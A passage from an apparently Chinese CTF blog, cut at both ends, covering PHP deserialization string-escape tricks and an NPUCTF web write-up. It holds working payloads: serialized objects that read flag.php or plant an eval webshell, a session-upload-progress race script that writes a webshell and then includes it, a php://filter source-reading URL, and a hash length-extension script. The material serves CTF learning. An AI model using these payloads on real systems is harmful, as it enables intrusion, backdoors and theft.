替换后去掉m的长度</span></span><br></pre></td></tr></table></figure><p>解方程得n=19，即我们要有19个x，y随意，从等式可以看出抵消了</p><p>如果碰到除不尽的情况，我们可以在<code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code>前面增加一些非<code>x</code>字符，类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;i:1;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>此时m的长度大于19</p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="2020安恒四月月赛"><a href="#2020安恒四月月赛" class="headerlink" title="2020安恒四月月赛"></a>2020安恒四月月赛</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $c = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$e = serialize($a);</span><br><span class="line">$c = write($e);</span><br><span class="line">$d = read($c);</span><br><span class="line">$b = unserialize($d); </span><br></pre></td></tr></table></figure><p>可以看到，我们可以控制GET参数a,b的值</p><p>在反序列化之前，序列化字符串经过了两次替换（<code>chr(0)</code>用<code>%00</code>替换）</p><p>第一次是把<code>%00*%00</code>替换成了<code>\0\0\0</code>，这里长度增加，由3变成6</p><p>第二次是把<code>\0\0\0</code>替换成了<code>%00*%00</code>，这里长度减少，由6变成3</p><p>先看下正常序列化的结果(a=admin,b=admin):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>首先我们知道，如果是嵌套的类（类里面的参数还是个类），举个例子，这里为了方便直接把读flag.php的链构造出来了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//     $c = &#x27;a&#x27;.$this-&gt;b;</span></span><br><span class="line">    <span class="comment">//     echo $c;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="comment">// function __toString()&#123;</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents($this-&gt;c);</span></span><br><span class="line">    <span class="comment">//     return &#x27;nice&#x27;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="keyword">new</span> C;</span><br><span class="line">$c-&gt;c=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$b=<span class="keyword">new</span> B;</span><br><span class="line">$b-&gt;b=$c;</span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>此时的序列化结果是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>由于我们传的A类username属性是一个B对象，所以后面就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>而这个B对象的b属性是一个C对象，所以还能分解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>明白类里面嵌套类的序列化格式，我们再来看怎末逃逸出去的。</p><p>首先我们要知道的下面一串是我们需要添上去的，长度为58</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>我们可以把序列化字符串放到username那里，并且用之前那个例子变长的那种思路，但是这种方式并不行，因为经过替换之后它又替换回来了,所以我们只能用变短的思路</p><p>总的思路:通俗的说就是username吃掉后面的password</p><p>正常序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时我们需要添加的就变成，长度为72</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>要吃掉的就是,长度23，**那里表示两位，表示password的长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:**:&quot;</span></span><br></pre></td></tr></table></figure><p>列方程,n代表<code>\0\0\0</code>的数目，y表示其它字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y<span class="comment">// 原字符长度 = 吃掉&quot;;s:8:&quot;password&quot;;s:**:&quot; + 替换后长度 </span></span><br><span class="line"><span class="comment">//其它字符在替换时不受影响 可以不考虑</span></span><br></pre></td></tr></table></figure><p>计算一下发现3n=23,除不尽，所以我们需要改下后面那串，前面增加点东西，类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>想获取多种payloaad，我们可以列式子，k表示增加的字符长度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>n+y=<span class="number">3</span>n+<span class="number">23</span>+y+k</span><br></pre></td></tr></table></figure><p>当k=1时 n=8</p><p>可以构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="string">B&quot;:1:&#123;s:1:&quot;</span><span class="string">b&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>也可以当k=4 n=9</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;abcd&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://xz.aliyun.com/t/6718">https://xz.aliyun.com/t/6718</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF writeup</title>
      <link href="2020/04/18/NPUCTF-writeup/"/>
      <url>2020/04/18/NPUCTF-writeup/</url>
      
        <content type="html"><![CDATA[<p>记一下writeup!    wtcl!</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h3><p>查源码得到flag</p><h3 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h3><p>在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/time.php?source</span><br></pre></td></tr></table></figure><p>看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125; </span><br><span class="line">$c=<span class="keyword">new</span> HelloPhp;</span><br><span class="line">$c-&gt;a = <span class="string">&#x27;file_put_contents(&quot;1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));&#x27;</span>;</span><br><span class="line">$c-&gt;b = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br></pre></td></tr></table></figure><p>蚁剑连上以后bypass disable_fuction在环境变量里找到flag</p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>查看源码发现<code>index.bak.php</code></p><p>伪协议读源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.bak.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;msg.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;content-type:application/json&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;msg is too loooong!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">&quot;/php/&quot;</span>,<span class="string">&quot;?&quot;</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>]))$_SESSION[<span class="string">&#x27;msg&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;msg&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">&#x27;msg&#x27;</span>], [<span class="string">&#x27;msg&#x27;</span>=&gt;safe($_POST[<span class="string">&#x27;msg&#x27;</span>]),<span class="string">&#x27;time&#x27;</span>=&gt;date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">&#x27;msg&#x27;</span>=&gt;safe($_POST[<span class="string">&#x27;msg&#x27;</span>]),<span class="string">&#x27;time&#x27;</span>=&gt;date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&quot;还不快去留言！&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再读下<code>index.bak.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;location:./index.bak.php?action=message.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，能包含，能控制session内容，但是无法写入php内容进里面</p><p>有个phpinfo.php，我们可以用包含临时文件那种</p><p>直接用Vulhub上的exp:</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p><p>或者用session上传进度那种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.97.210.141:9555/index.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php echo &quot;flag&quot;;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);&#x27;);?&gt;&#x27;&#x27;&#x27;</span>    <span class="comment">#恶意进度信息，readfile将直接输出文件内容</span></span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(<span class="string">&quot;http://47.97.210.141:9555/index.bak.php?action=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    threading.Thread(target=POST,args=()).start()</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>然后蚁剑连，bypass disable_function就行了</p><h3 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h3><p>抓包看到</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200423111717.png" style="zoom:80%;"><p>很明显hash长度扩展攻击</p><p>这题出的好像有点问题，直接把hash给了出来，如下图把Hash的值复制到pass就可以绕过</p><img src="/2020/04/18/NPUCTF-writeup/TIM截图20200423152852.png" style="zoom:80%;"><p>按照正常的思路我们是需要爆破长度的，首先我们需要知道<code>$secret+某个值</code>的hash值，尝试的还是上面的操作</p><p>然后就可以写exp了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ac35c878-20c8-4151-a64f-f832b83fee89.node3.buuoj.cn/?&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;576322dd496b99d07b5b0f7fa7934a25&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">m=hashpumpy.hashpump(hsh,s1,s2,i)</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">name=urllib.quote(urllib.unquote(m[<span class="number">1</span>]))</span><br><span class="line">uri=url+<span class="string">&#x27;name=&#x27;</span>+name+<span class="string">&quot;&amp;pass=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> uri</span><br><span class="line">r=requests.get(uri)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> 